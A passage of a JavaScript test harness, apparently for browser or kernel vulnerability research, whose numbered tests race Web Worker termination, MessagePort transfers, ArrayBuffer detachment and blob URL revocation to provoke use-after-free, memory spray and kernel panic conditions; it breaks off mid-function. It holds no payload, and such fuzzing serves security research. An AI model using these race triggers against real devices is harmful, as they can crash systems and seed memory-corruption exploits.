        // Aborta metade para estressar a remoção do kqueue
        while(readers.length > 10) {
            var r = readers.pop();
            r.abort();
        }
        setTimeout(loop, 5);
    }
    loop();
    setTimeout(function(){ running=false; log("186: Done"); }, 4000);
}
function runTest187() {
    log("187. Worker Chain...");
    var code = `
        self.onmessage = function(e) {
            if(e.data > 0) {
                var w = new Worker(self.location.href);
                w.postMessage(e.data - 1);
                var arr = new Uint32Array(1024);
                setInterval(() => { w.terminate(); }, 10);
            }
        };
    `;
    var u = URL.createObjectURL(new Blob([code], {type:'text/javascript'}));
    var roots = [];
    var i = setInterval(function() {
        var w = new Worker(u);
        roots.push(w);
        w.postMessage(5);
        if(roots.length > 20) {
            var old = roots.shift();
            old.terminate();
        }
    }, 15);
    setTimeout(function(){ clearInterval(i); roots.forEach(w=>w.terminate()); log("187: Done"); }, 4000);
}

function runTest188() {
    log("188. Port Circular...");
    var c1 = new MessageChannel();
    var c2 = new MessageChannel();
    var p1 = c1.port1;
    var p2 = c1.port2;
    var p3 = c2.port1;
    var p4 = c2.port2;
    var i = setInterval(function() {
        try {
            p1.postMessage(p3, [p3]);
            p2.onmessage = function(e) {
                var port = e.data;
                port.postMessage(p2, [p2]);
                port.close();
            };
            if(Math.random() > 0.8) {
                p1.close();
                c1 = new MessageChannel();
                p1 = c1.port1; p2 = c1.port2;
            }
        } catch(e) {}
    }, 5);
    setTimeout(function(){ clearInterval(i); log("188: Done"); }, 4000);
}

function runTest189() {
    log("189. View Detach...");
    var buf = new ArrayBuffer(1024 * 1024);
    var view = new DataView(buf);
    var w = new Worker(URL.createObjectURL(new Blob(['onmessage=function(e){postMessage("ack");}'],{type:'text/javascript'})));
    var i = setInterval(function() {
        try {
            if(buf.byteLength > 0) {
                view.setInt8(0, 1);
                w.postMessage(buf, [buf]);
                var val = view.getInt8(0);
                log("189 Fail: Read " + val);
            } else {
                buf = new ArrayBuffer(1024 * 1024);
                view = new DataView(buf);
            }
        } catch(e) {}
    }, 5);
    setTimeout(function(){ clearInterval(i); w.terminate(); log("189: Done"); }, 4000);
}

function runTest190() {
    log("190. Vnode Revoke...");
    var b = new Blob(["A".repeat(1024*1024)]);
    var workers = [];
    var i = setInterval(function() {
        var u = URL.createObjectURL(b);
        var w = new Worker(u);
        workers.push(w);
        w.postMessage("init");
        URL.revokeObjectURL(u);
        if(workers.length > 30) {
            var d = workers.shift();
            d.terminate();
        }
    }, 10);
    setTimeout(function(){ clearInterval(i); workers.forEach(w=>w.terminate()); log("190: Done"); }, 5000);
}

function runTest191() {
    log("191. IPC Pipe Write...");
    var mc = new MessageChannel();
    var p1 = mc.port1;
    var p2 = mc.port2;
    var load = new Uint8Array(1024 * 64);
    var i = setInterval(function() {
        try {
            for(var k=0; k<20; k++) p1.postMessage(load);
            var w = new Worker(URL.createObjectURL(new Blob(['onmessage=function(e){e.data.close();}'],{type:'text/javascript'})));
            w.postMessage(p2, [p2]);
            setTimeout(() => { w.terminate(); }, 2);
            mc = new MessageChannel();
            p1 = mc.port1; p2 = mc.port2;
        } catch(e) {}
    }, 15);
    setTimeout(function(){ clearInterval(i); log("191: Done"); }, 5000);
}

function runTest192() {
    log("192. File Ref Overflow...");
    var b = new Blob(["test"]);
    var reqs = [];
    var i = setInterval(function() {
        try {
            var xhr = new XMLHttpRequest();
            xhr.open("GET", URL.createObjectURL(b), true);
            xhr.send();
            reqs.push(xhr);
            if(reqs.length > 100) {
                var x = reqs.shift();
                x.abort();
            }
            var junk = new ArrayBuffer(1024 * 1024);
        } catch(e) {}
    }, 5);
    setTimeout(function(){ clearInterval(i); log("192: Done"); }, 5000);
}
function runTest193() {
    log("193. Worker Stack Race...");
    var code = `
        self.onmessage = function(e) {
            if(e.data > 0) {
                var w = new Worker(self.location.href);
                w.postMessage(e.data - 1);
                var f = new Float64Array(1024);
                while(true) { Math.random(); }
            }
        };
    `;
    var u = URL.createObjectURL(new Blob([code], {type: 'text/javascript'}));
    var roots = [];
    var i = setInterval(function() {
        var w = new Worker(u);
        roots.push(w);
        w.postMessage(10);
        if(roots.length > 15) {
            var v = roots.shift();
            v.terminate();
            v = null;
            var junk = new ArrayBuffer(1024*1024);
        }
    }, 15);
    setTimeout(function(){ clearInterval(i); roots.forEach(w=>w.terminate()); log("193: Done"); }, 4000);
}

function runTest194() {
    log("194. Port UAF...");
    var c = new MessageChannel();
    var p1 = c.port1;
    var p2 = c.port2;
    var w = new Worker(URL.createObjectURL(new Blob(['onmessage=function(e){e.data.postMessage("pong");}'],{type:'text/javascript'})));
    var i = setInterval(function() {
        try {
            var sub = new MessageChannel();
            w.postMessage(sub.port1, [sub.port1]);
            p1.postMessage("ping", [sub.port2]);
            if(Math.random() > 0.6) {
                p1.close();
                c = new MessageChannel();
                p1 = c.port1; p2 = c.port2;
            }
            var pressure = new Uint8Array(1024 * 512);
        } catch(e) { log("194 Err: " + e.message); }
    }, 5);
    setTimeout(function(){ clearInterval(i); w.terminate(); log("194: Done"); }, 4000);
}

function runTest195() {
    log("195. Neuter Trap...");
    var b = new ArrayBuffer(1024 * 1024);
    var v = new Uint8Array(b);
    var w = new Worker(URL.createObjectURL(new Blob(['onmessage=function(e){postMessage("ack");}'],{type:'text/javascript'})));
    var o = { buf: b };
    var trap = {
        get x() {
            w.postMessage(b, [b]);
            return 1;
        }
    };
    try {
        Object.prototype.__defineGetter__("y", function(){ return trap.x; });
        w.postMessage(o);
        if(b.byteLength === 0) {
            log("195: Neuter success");
            var read = v[0]; 
        }
    } catch(e) { log("195: " + e.message); }
    setTimeout(function(){ w.terminate(); }, 1000);
}

function runTest196() {
    log("196. Kthread Panic...");
    var code = `
        onmessage = function() {
            var x = new XMLHttpRequest();
            x.open("GET", "http://127.0.0.1:8888", false); 
            try { x.send(); } catch(e){}
        }
    `;
    var u = URL.createObjectURL(new Blob([code], {type:'text/javascript'}));
    var pool = [];
    var t = setInterval(function() {
        var w = new Worker(u);
        w.postMessage("run");
        pool.push(w);
        if(pool.length > 25) {
            var old = pool.shift();
            old.terminate(); 
        }
    }, 20);
    setTimeout(function(){ clearInterval(t); pool.forEach(w=>w.terminate()); log("196: Done"); }, 5000);
}

function runTest197() {
    log("197. IPC Circular...");
    var ports = [];
    for(var k=0; k<100; k++) {
        var mc = new MessageChannel();
        ports.push(mc);
    }
    var i = setInterval(function() {
        try {
            var idx = Math.floor(Math.random() * ports.length);
            var next = (idx + 1) % ports.length;
            ports[idx].port1.postMessage(ports[next].port2, [ports[next].port2]);
            if(Math.random() > 0.9) {
                var dead = ports.splice(idx, 1)[0];
                dead.port1.close();
            }
        } catch(e){}
    }, 5);
    setTimeout(function(){ clearInterval(i); log("197: Done"); }, 5000);
}

function runTest198() {
    log("198. VFS Reclaim...");
    var data = new Uint8Array(1024 * 1024 * 2);
    var reqs = [];
    var i = setInterval(function() {
        var b = new Blob([data]);
        var u = URL.createObjectURL(b);
        var xhr = new XMLHttpRequest();
        xhr.open("GET", u, true);
        xhr.send();
        reqs.push(xhr);
        URL.revokeObjectURL(u);
        b = null; 
        if(reqs.length > 20) {
            reqs.shift().abort();
            var fill = new ArrayBuffer(1024*1024);
        }
    }, 10);
    setTimeout(function(){ clearInterval(i); log("198: Done"); }, 5000);
}
function runTest199() {
    log("199. GC Stack Race...");
    var code = `
        self.onmessage = function(e) {
            var root = { next: null };
            var curr = root;
            for(var i=0; i<5000; i++) {
                curr.next = { data: new Uint8Array(1024), ref: root };
                curr = curr.next;
            }
            postMessage(root);
        };
    `;
    var u = URL.createObjectURL(new Blob([code], {type:'text/javascript'}));
    var w = new Worker(u);
    var i = setInterval(function() {
        w.postMessage("build");
        var huge = [];
        for(var k=0; k<1000; k++) huge.push({a:k});
        w.terminate();
        w = new Worker(u);
    }, 20);
    setTimeout(function(){ clearInterval(i); w.terminate(); log("199: Done"); }, 4000);
}

function runTest200() {
    log("200. In-Flight UAF...");
    var mc1 = new MessageChannel();
    var mc2 = new MessageChannel();
    var p1 = mc1.port1;
    var i = setInterval(function() {
        try {
            var sub = new MessageChannel();
            p1.postMessage(sub.port1, [sub.port1]);
            mc1.port2.close();
            p1.close();
            
            mc1 = new MessageChannel();
            p1 = mc1.port1;
            
            var buf = new ArrayBuffer(1024 * 512);
        } catch(e) { log("200 Err: " + e.message); }
    }, 5);
    setTimeout(function(){ clearInterval(i); log("200: Done"); }, 4000);
}

function runTest201() {
    log("201. FileReader Sync...");
    var b = new Blob(["test".repeat(1000)]);
    var u = URL.createObjectURL(b);
    var code = `
        self.onmessage = function(e) {
            try {
                var x = new XMLHttpRequest();
                x.open("GET", e.data, false);
                x.send();
                postMessage(x.responseText);
            } catch(z){}
        };
    `;
    var wu = URL.createObjectURL(new Blob([code], {type:'text/javascript'}));
    var workers = [];
    var i = setInterval(function() {
        var w = new Worker(wu);
        workers.push(w);
        w.postMessage(u);
        if(workers.length > 10) {
            var old = workers.shift();
            old.terminate();
            URL.revokeObjectURL(u);
            u = URL.createObjectURL(b); 
        }
    }, 10);
    setTimeout(function(){ clearInterval(i); workers.forEach(k=>k.terminate()); log("201: Done"); }, 4000);
}

function runTest202() {
    log("202. Cascade Kill...");
    var code = `
        self.onmessage = function(e) {
            if(e.data < 20) {
                var w = new Worker(self.location.href);
                w.postMessage(e.data + 1);
            } else {
                while(true) {}
            }
        };
    `;
    var u = URL.createObjectURL(new Blob([code], {type:'text/javascript'}));
    var root = new Worker(u);
    root.postMessage(0);
    
    setTimeout(function() {
        root.terminate();
        var junk = new Uint32Array(1024 * 1024);
        log("202: Root killed, checking kernel cleanup");
    }, 2000);
}

function runTest203() {
    log("203. Circular Deadlock...");
    var ports = [];
    for(var j=0; j<50; j++) ports.push(new MessageChannel());
    
    var i = setInterval(function() {
        try {
            var idx = Math.floor(Math.random() * (ports.length - 1));
            var mcA = ports[idx];
            var mcB = ports[idx+1];
            
            mcA.port1.postMessage(mcB.port1, [mcB.port1]);
            mcB.port2.postMessage(mcA.port2, [mcA.port2]);
            
            ports.splice(idx, 2);
            ports.push(new MessageChannel());
            ports.push(new MessageChannel());
        } catch(e) {}
    }, 5);
    setTimeout(function(){ clearInterval(i); log("203: Done"); }, 5000);
}

function runTest204() {
    log("204. Mbuf Cluster...");
    var chunk = new Uint8Array(65536).fill(0x41);
    var b = new Blob([chunk]);
    var reqs = [];
    var i = setInterval(function() {
        try {
            var xhr = new XMLHttpRequest();
            xhr.open("POST", "/mbuf_flood", true);
            xhr.send(b);
            reqs.push(xhr);
            if(reqs.length > 60) {
                var batch = reqs.splice(0, 30);
                batch.forEach(x => x.abort());
            }
        } catch(e) {}
    }, 5);
    setTimeout(function(){ clearInterval(i); log("204: Done"); }, 5000);
}
function runTest205() {
    log("205. Blob GC Race...");
    var code = `
        self.onmessage = function(e) {
            var arr = [];
            for(var i=0; i<100; i++) {
                var b = new Blob([new Uint8Array(1024)]);
                var u = URL.createObjectURL(b);
                arr.push(u);
            }
            postMessage(arr);
        };
    `;
    var u = URL.createObjectURL(new Blob([code], {type: 'text/javascript'}));
    var w = new Worker(u);
    w.onmessage = function(e) {
        var urls = e.data;
        w.terminate(); 
        for(var k=0; k<urls.length; k++) URL.revokeObjectURL(urls[k]);
        log("205: Cycle done");
    };
    w.postMessage("go");
    setTimeout(function(){ 
        if(w) w.terminate(); 
        URL.revokeObjectURL(u);
    }, 2000);
}

function runTest206() {
    log("206. Port Collision...");
    var mc = new MessageChannel();
    var p1 = mc.port1;
    var transferList = [p1];
    var w = new Worker(URL.createObjectURL(new Blob(['onmessage=function(e){try{e.data.close();}catch(z){}}'],{type:'text/javascript'})));
    
    var i = setInterval(function() {
        try {
            var sub = new MessageChannel();
            w.postMessage(sub.port1, [sub.port1]);
            
            p1.postMessage("race", [sub.port2]);
            
            sub.port2.close();
            
            var junk = new ArrayBuffer(1024 * 1024);
        } catch(e) {
            log("206 Catch: " + e.message);
        }
    }, 5);
    setTimeout(function(){ clearInterval(i); w.terminate(); log("206: Done"); }, 4000);
}

function runTest207() {
    log("207. Buffer Detach...");
    var buf = new ArrayBuffer(1024 * 1024);
    var src = new Uint8Array(buf);
    
    var proxy = new Proxy(src, {
        get: function(target, prop) {
            if (prop === 'length') {
                var w = new Worker(URL.createObjectURL(new Blob([''],{type:'text/javascript'})));
                w.postMessage(buf, [buf]); 
                w.terminate();
                return 1024 * 1024;
            }
            return Reflect.get(target, prop);
        }
    });
    
    try {
        var copy = new Uint8Array(proxy); 
        log("207 Fail: Copy succeeded len=" + copy.length);
    } catch(e) {
        log("207 Trapped: " + e.message);
    }
}

function runTest208() {
    log("208. Sync Socket Kill...");
    var code = `
        onmessage = function() {
            try {
                var x = new XMLHttpRequest();
                x.open("GET", "http://127.0.0.1:54321", false);
                x.send();
            } catch(e){}
        };
    `;
    var u = URL.createObjectURL(new Blob([code], {type:'text/javascript'}));
    var pool = [];
    var i = setInterval(function() {
        var w = new Worker(u);
        w.postMessage("start");
        pool.push(w);
        
        if(pool.length > 30) {
            var d = pool.shift();
            d.terminate(); 
        }
    }, 15);
    setTimeout(function(){ clearInterval(i); pool.forEach(p=>p.terminate()); log("208: Done"); }, 5000);
}

function runTest209() {
    log("209. Pipe Storm...");
    var channels = [];
    var msg = new Uint8Array(2048).fill(0xAA);
    var i = setInterval(function() {
        for(var k=0; k<10; k++) {
            var mc = new MessageChannel();
            mc.port1.postMessage(msg);
            channels.push(mc);
        }
        while(channels.length > 50) {
            var old = channels.shift();
            old.port1.close();
            old.port2.close();
        }
    }, 10);
    setTimeout(function(){ clearInterval(i); log("209: Done"); }, 5000);
}

function runTest210() {
    log("210. Vnode Slice Race...");
    var blob = new Blob([new Uint8Array(1024 * 1024 * 5)]); 
    var reqs = [];
    var i = setInterval(function() {
        var start = Math.floor(Math.random() * 1024 * 1024);
        var slice = blob.slice(start, start + 4096);
        var fr = new FileReader();
        fr.readAsArrayBuffer(slice);
        reqs.push(fr);
        
        if(reqs.length > 40) {
            var r = reqs.shift();
            r.abort();
        }
    }, 5);
    setTimeout(function(){ clearInterval(i); log("210: Done"); }, 5000);
}
function runTest211() {
    log("211. Worker Fork...");
    var code = `
        self.onmessage = function(e) {
            if(e.data > 0) {
                var w = new Worker(self.location.href);
                w.postMessage(e.data - 1);
                var arr = new Float64Array(512);
                for(var i=0; i<512; i++) arr[i] = Math.random();
            }
        };
    `;
    var u = URL.createObjectURL(new Blob([code], {type:'text/javascript'}));
    var roots = [];
    var t = setInterval(function() {
        var w = new Worker(u);
        roots.push(w);
        w.postMessage(8);
        if(roots.length > 12) {
            var k = roots.shift();
            k.terminate();
            k = null;
        }
    }, 20);
    setTimeout(function(){ clearInterval(t); roots.forEach(x=>x.terminate()); log("211: Done"); }, 4000);
}

function runTest212() {
    log("212. Port Entangle...");
    var c1 = new MessageChannel();
    var c2 = new MessageChannel();
    var p1 = c1.port1;
    var p2 = c1.port2;
    var p3 = c2.port1;
    var t = setInterval(function() {
        try {
            var temp = new MessageChannel();
            p1.postMessage(temp.port1, [temp.port1]);
            p2.postMessage(p3, [p3]);
            temp.port2.onmessage = function(e) { e.data.close(); };
            if(Math.random() > 0.7) {
                p2.close();
                c1 = new MessageChannel();
                p1 = c1.port1; p2 = c1.port2;
            }
        } catch(e){}
    }, 5);
    setTimeout(function(){ clearInterval(t); log("212: Done"); }, 4000);
}

function runTest213() {
    log("213. Heap Reclaim...");
    var buf = new ArrayBuffer(1024 * 1024);
    var view = new Uint32Array(buf);
    view[0] = 0x12345678;
    var w = new Worker(URL.createObjectURL(new Blob(['onmessage=function(e){postMessage("k");}'],{type:'text/javascript'})));
    var t = setInterval(function() {
        try {
            if(buf.byteLength > 0) {
                w.postMessage(buf, [buf]);
                var val = view[0]; 
                log("213 Fail: " + val);
            } else {
                buf = new ArrayBuffer(1024 * 1024);
                view = new Uint32Array(buf);
                view[0] = 0xCAFEBABE;
            }
        } catch(e) {}
    }, 10);
    setTimeout(function(){ clearInterval(t); w.terminate(); log("213: Done"); }, 4000);
}

function runTest214() {
    log("214. Sync Kill...");
    var code = `
        onmessage = function() {
            var x = new XMLHttpRequest();
            x.open("GET", "http://0.0.0.0:1", false);
            try { x.send(); } catch(e){}
        };
    `;
    var u = URL.createObjectURL(new Blob([code], {type:'text/javascript'}));
    var pool = [];
    var t = setInterval(function() {
        var w = new Worker(u);
        w.postMessage("go");
        pool.push(w);
        if(pool.length > 20) {
            var v = pool.shift();
            v.terminate();
        }
    }, 15);
    setTimeout(function(){ clearInterval(t); pool.forEach(x=>x.terminate()); log("214: Done"); }, 5000);
}

function runTest215() {
    log("215. IPC Panic...");
    var w = new Worker(URL.createObjectURL(new Blob(['onmessage=function(e){}'],{type:'text/javascript'})));
    var ports = [];
    for(var i=0; i<1500; i++) {
        var c = new MessageChannel();
        ports.push(c.port2);
    }
    setTimeout(function() {
        try {
            var batch = ports.splice(0, 1000);
            w.postMessage("flood", batch);
            setTimeout(() => { w.terminate(); }, 2);
        } catch(e) { log("215: " + e.message); }
    }, 100);
    setTimeout(function(){ log("215: Done"); }, 3000);
}

function runTest216() {
    log("216. Vnode Revoke...");
    var data = new Uint8Array(1024 * 1024 * 4);
    var reqs = [];
    var t = setInterval(function() {
        var b = new Blob([data]);
        var u = URL.createObjectURL(b);
        var xhr = new XMLHttpRequest();
        xhr.open("GET", u, true);
        xhr.send();
        reqs.push(xhr);
        URL.revokeObjectURL(u);
        if(reqs.length > 30) {
            reqs.shift().abort();
            var junk = new ArrayBuffer(1024*1024);
        }
    }, 10);
    setTimeout(function(){ clearInterval(t); log("216: Done"); }, 5000);
}
function runTest217() {
    log("217. Worker GC Bomb...");
    var code = `
        self.onmessage = function(e) {
            var junk = [];
            for(var i=0; i<5000; i++) junk.push(new Uint8Array(1024));
            postMessage(junk);
            self.close();
        };
    `;
    var u = URL.createObjectURL(new Blob([code], {type:'text/javascript'}));
    var t = setInterval(function() {
        var w = new Worker(u);
        w.onmessage = function(e) { e.data = null; };
        w.postMessage("go");
        var pressure = new ArrayBuffer(1024 * 1024 * 8);
        w.terminate();
    }, 20);
    setTimeout(function(){ clearInterval(t); URL.revokeObjectURL(u); log("217: Done"); }, 4000);
}

function runTest218() {
    log("218. Port Detach Race...");
    var buf = new ArrayBuffer(1024 * 1024);
    var mc = new MessageChannel();
    var p1 = mc.port1;
    var w = new Worker(URL.createObjectURL(new Blob(['onmessage=function(e){postMessage("ack");}'],{type:'text/javascript'})));
    var t = setInterval(function() {
        try {
            if(buf.byteLength > 0) {
                var sub = new MessageChannel();
                w.postMessage({p: sub.port1, b: buf}, [sub.port1, buf]);
                sub.port2.close();
                p1.postMessage("race");
            } else {
                buf = new ArrayBuffer(1024 * 1024);
            }
        } catch(e) {}
    }, 5);
    setTimeout(function(){ clearInterval(t); w.terminate(); log("218: Done"); }, 4000);
}

function runTest219() {
    log("219. Blob Revoke Race...");
    var data = new Uint8Array(1024 * 1024);
    var reqs = [];
    var t = setInterval(function() {
        var b = new Blob([data]);
        var u = URL.createObjectURL(b);
        for(var k=0; k<5; k++) {
            var x = new XMLHttpRequest();
            x.open("GET", u, true);
            x.send();
            reqs.push(x);
        }
        URL.revokeObjectURL(u);
        b = null;
        if(reqs.length > 50) {
            while(reqs.length > 0) reqs.shift().abort();
        }
    }, 15);
    setTimeout(function(){ clearInterval(t); log("219: Done"); }, 4000);
}

function runTest220() {
    log("220. Sync Socket Kill...");
    var code = `
        self.onmessage = function() {
            var x = new XMLHttpRequest();
            x.open("GET", "http://127.0.0.1:4444", false);
            try { x.send(); } catch(e){}
        };
    `;
    var u = URL.createObjectURL(new Blob([code], {type:'text/javascript'}));
    var pool = [];
    var t = setInterval(function() {
        var w = new Worker(u);
        w.postMessage("start");
        pool.push(w);
        if(pool.length > 25) {
            var v = pool.shift();
            v.terminate();
        }
    }, 10);
    setTimeout(function(){ clearInterval(t); pool.forEach(k=>k.terminate()); log("220: Done"); }, 5000);
}

function runTest221() {
    log("221. IPC Chain Destruct...");
    var ports = [];
    for(var i=0; i<100; i++) ports.push(new MessageChannel());
    var t = setInterval(function() {
        try {
            for(var k=0; k<ports.length-1; k++) {
                ports[k].port1.postMessage(ports[k+1].port2, [ports[k+1].port2]);
            }
            var idx = Math.floor(Math.random() * ports.length);
            ports[idx].port1.close();
            ports[idx] = new MessageChannel();
        } catch(e) {}
    }, 10);
    setTimeout(function(){ clearInterval(t); log("221: Done"); }, 5000);
}

function runTest222() {
    log("222. Mbuf Spray...");
    var chunk = new Uint8Array(2048).fill(0xFE);
    var reqs = [];
    var t = setInterval(function() {
        try {
            var x = new XMLHttpRequest();
            x.open("POST", "/mbuf_frag_" + Math.random(), true);
            x.send(chunk);
            reqs.push(x);
            if(reqs.length > 100) {
                var batch = reqs.splice(0, 50);
                batch.forEach(r => r.abort());
            }
        } catch(e) {}
    }, 5);
    setTimeout(function(){ clearInterval(t); log("222: Done"); }, 5000);
}
function runTest223() {
    log("223. Stack Race...");
    var code = `
        function r(n) {
            if(n<=0) return new Uint8Array(10);
            var x = new Float64Array(128);
            return r(n-1);
        }
        self.onmessage = function() { r(20000); };
    `;
    var u = URL.createObjectURL(new Blob([code], {type:'text/javascript'}));
    var w = new Worker(u);
    var t = setInterval(function() {
        w.terminate();
        w = new Worker(u);
        w.postMessage("run");
        var heap = new ArrayBuffer(1024 * 1024 * 2);
    }, 10);
    setTimeout(function(){ clearInterval(t); w.terminate(); log("223: Done"); }, 4000);
}

function runTest224() {
    log("224. Channel Loop...");
    var mc = new MessageChannel();
    var p1 = mc.port1;
    var t = setInterval(function() {
        try {
            var sub = new MessageChannel();
            p1.postMessage(sub.port2, [sub.port2]);
            sub.port1.onmessage = function(e) { e.data.close(); };
            sub.port1.postMessage(p1);
            if(Math.random() > 0.8) {
                mc = new MessageChannel();
                p1 = mc.port1;
            }
        } catch(e) {}
    }, 5);
    setTimeout(function(){ clearInterval(t); log("224: Done"); }, 4000);
}

function runTest225() {
    log("225. GC Trap...");
    var w = new Worker(URL.createObjectURL(new Blob(['onmessage=function(e){postMessage("done");}'],{type:'text/javascript'})));
    var root = { a: [] };
    for(var k=0; k<1000; k++) root.a.push({x: new Uint8Array(1024)});
    var t = setInterval(function() {
        w.postMessage(root);
        root = { a: [] };
        for(var i=0; i<5000; i++) root.a.push({n: i});
        var pressure = new ArrayBuffer(1024 * 1024 * 4);
    }, 20);
    setTimeout(function(){ clearInterval(t); w.terminate(); log("225: Done"); }, 4000);
}

function runTest226() {
    log("226. Sync Kill...");
    var code = `
        self.onmessage = function() {
            var x = new XMLHttpRequest();
            x.open("GET", "http://127.0.0.1:1337", false);
            try { x.send(); } catch(e){}
        };
    `;
    var u = URL.createObjectURL(new Blob([code], {type:'text/javascript'}));
    var workers = [];
    var t = setInterval(function() {
        var w = new Worker(u);
        w.postMessage("go");
        workers.push(w);
        if(workers.length > 15) {
            var k = workers.shift();
            k.terminate();
        }
    }, 30);
    setTimeout(function(){ clearInterval(t); workers.forEach(x=>x.terminate()); log("226: Done"); }, 5000);
}

function runTest227() {
    log("227. IPC Overflow...");
    var ports = [];
    for(var i=0; i<200; i++) ports.push(new MessageChannel());
    var t = setInterval(function() {
        try {
            var idx = Math.floor(Math.random() * (ports.length - 1));
            var a = ports[idx];
            var b = ports[idx+1];
            a.port1.postMessage(b.port1, [b.port1]);
            b.port2.postMessage(a.port2, [a.port2]);
            if(ports.length < 50) ports.push(new MessageChannel());
            else ports.splice(0, 5);
        } catch(e){}
    }, 10);
    setTimeout(function(){ clearInterval(t); log("227: Done"); }, 4000);
}

function runTest228() {
    log("228. Vnode Read...");
    var blob = new Blob([new Uint8Array(1024 * 1024 * 2)]);
    var reqs = [];
    var t = setInterval(function() {
        var start = Math.floor(Math.random() * 1024 * 1024);
        var s = blob.slice(start, start + 8192);
        var fr = new FileReader();
        fr.readAsArrayBuffer(s);
        reqs.push(fr);
        if(reqs.length > 50) {
            var r = reqs.shift();
            r.abort();
            blob = new Blob([new Uint8Array(1024)]);
        }
    }, 5);
    setTimeout(function(){ clearInterval(t); log("228: Done"); }, 5000);
}
function runTest229() {
    log("229. Proxy Race...");
    var u = URL.createObjectURL(new Blob(["onmessage=function(e){postMessage(e.data);}"], {type:'text/javascript'}));
    var w = new Worker(u);
    var t = setInterval(function() {
        var p = new Proxy({}, {
            get: function(target, prop) {
                w.terminate();
                return new Uint8Array(1024*1024);
            }
        });
        try {
            w.postMessage(p);
            w = new Worker(u);
            var arr = [];
            for(var i=0; i<1000; i++) arr.push({a: p});
        } catch(e) {
            log("229: " + e.message);
        }
    }, 15);
    setTimeout(function(){ clearInterval(t); if(w) w.terminate(); log("229: Done"); }, 4000);
}

function runTest230() {
    log("230. Detach Access...");
    var mc = new MessageChannel();
    var buf = new ArrayBuffer(1024 * 1024);
    var view = new DataView(buf);
    var t = setInterval(function() {
        try {
            if(buf.byteLength > 0) {
                var sub = new MessageChannel();
                sub.port1.postMessage(buf, [buf]);
                mc.port1.postMessage("ping");
                sub.port1.close();
                view.setInt8(0, 0xFF); 
            } else {
                buf = new ArrayBuffer(1024 * 1024);
                view = new DataView(buf);
            }
        } catch(e) {}
    }, 5);
    setTimeout(function(){ clearInterval(t); log("230: Done"); }, 4000);
}

function runTest231() {
    log("231. Import Race...");
    var b = new Blob(["try{importScripts(self.location.href);}catch(e){}"]);
    var workers = [];
    var t = setInterval(function() {
        var u = URL.createObjectURL(b);
        var w = new Worker(u);
        workers.push(w);
        if(Math.random() > 0.5) URL.revokeObjectURL(u);
        if(workers.length > 20) {
            var k = workers.shift();
            k.terminate();
        }
    }, 10);
    setTimeout(function(){ clearInterval(t); workers.forEach(x=>x.terminate()); log("231: Done"); }, 4000);
}

function runTest232() {
    log("232. Sync Kill...");
    var code = "onmessage=function(){var x=new XMLHttpRequest();x.open('GET','http://127.0.0.1:81',false);try{x.send();}catch(e){}}";
    var u = URL.createObjectURL(new Blob([code], {type:'text/javascript'}));
    var pool = [];
    var t = setInterval(function() {
        for(var i=0; i<5; i++) {
            var w = new Worker(u);
            w.postMessage("run");
            pool.push(w);
        }
        if(pool.length > 30) {
            var batch = pool.splice(0, 15);
            batch.forEach(k => k.terminate());
        }
    }, 40);
    setTimeout(function(){ clearInterval(t); pool.forEach(x=>x.terminate()); log("232: Done"); }, 5000);
}

function runTest233() {
    log("233. IPC Deadlock...");
    var ports = [];
    for(var i=0; i<100; i++) ports.push(new MessageChannel());
    var t = setInterval(function() {
        try {
            var len = ports.length;
            if(len < 2) return;
            var a = ports[Math.floor(Math.random()*len)];
            var b = ports[Math.floor(Math.random()*len)];
            a.port1.postMessage(b.port2, [b.port2]);
            b.port1.postMessage(a.port2, [a.port2]);
            if(len > 150) ports.splice(0, 10);
            else ports.push(new MessageChannel());
        } catch(e) {}
    }, 5);
    setTimeout(function(){ clearInterval(t); log("233: Done"); }, 4000);
}

function runTest234() {
    log("234. Fetch Mbuf...");
    var b = new Uint8Array(65536);
    var c = new AbortController();
    var reqs = [];
    var t = setInterval(function() {
        try {
            fetch("/mbuf_leak", {method:'POST', body:b, signal:c.signal}).catch(e=>{});
            reqs.push(c);
            c = new AbortController();
            if(reqs.length > 100) {
                var old = reqs.shift();
                old.abort();
            }
        } catch(e) {}
    }, 2);
    setTimeout(function(){ clearInterval(t); log("234: Done"); }, 4000);
}
function runTest235() {
    log("235. Deep GC Race...");
    var u = URL.createObjectURL(new Blob(["onmessage=function(e){postMessage(e.data);}"], {type:'text/javascript'}));
    var t = setInterval(function() {
        var w = new Worker(u);
        var obj = {n: null};
        var ptr = obj;
        for(var i=0; i<2000; i++) {
            ptr.n = {v: new Uint8Array(128), n: null};
            ptr = ptr.n;
        }
        w.postMessage(obj);
        var pressure = new Float64Array(1024*1024);
        w.terminate();
    }, 30);
    setTimeout(function(){ clearInterval(t); URL.revokeObjectURL(u); log("235: Done"); }, 4000);
}

function runTest236() {
    log("236. Getter Trap...");
    var mc = new MessageChannel();
    var p1 = mc.port1;
    var t = setInterval(function() {
        try {
            var sub = new MessageChannel();
            var trap = {
                get port() {
                    sub.port1.close();
                    return sub.port2;
                }
            };
            p1.postMessage(trap, [sub.port2]);
        } catch(e) {}
        mc = new MessageChannel();
        p1 = mc.port1;
    }, 10);
    setTimeout(function(){ clearInterval(t); log("236: Done"); }, 4000);
}

function runTest237() {
    log("237. Zombie Access...");
    var buf = new ArrayBuffer(1024 * 1024);
    var view = new Uint8Array(buf);
    view[0] = 1;
    var w = new Worker(URL.createObjectURL(new Blob(['onmessage=function(e){postMessage("a");}'],{type:'text/javascript'})));
    var t = setInterval(function() {
        if(buf.byteLength > 0) {
            w.postMessage(buf, [buf]);
            if(buf.byteLength === 0) {
                 try { var v = view[0]; } catch(e){}
            }
        } else {
            buf = new ArrayBuffer(1024 * 1024);
            view = new Uint8Array(buf);
            view[0] = 1;
        }
    }, 5);
    setTimeout(function(){ clearInterval(t); w.terminate(); log("237: Done"); }, 4000);
}

function runTest238() {
    log("238. Kthread Storm...");
    var code = "onmessage=function(){var x=new XMLHttpRequest();x.open('GET','http://127.0.0.1:6000',false);try{x.send();}catch(e){}}";
    var u = URL.createObjectURL(new Blob([code], {type:'text/javascript'}));
    var pool = [];
    var t = setInterval(function() {
        for(var i=0; i<3; i++) {
            var w = new Worker(u);
            w.postMessage("run");
            pool.push(w);
        }
        if(pool.length > 20) {
            var batch = pool.splice(0, 10);
            batch.forEach(k => k.terminate());
        }
    }, 40);
    setTimeout(function(){ clearInterval(t); pool.forEach(x=>x.terminate()); log("238: Done"); }, 5000);
}

function runTest239() {
    log("239. Port Reclaim...");
    var chain = [];
    for(var i=0; i<60; i++) chain.push(new MessageChannel());
    var t = setInterval(function() {
        try {
            var idx = Math.floor(Math.random() * (chain.length - 2));
            var mc1 = chain[idx];
            var mc2 = chain[idx+1];
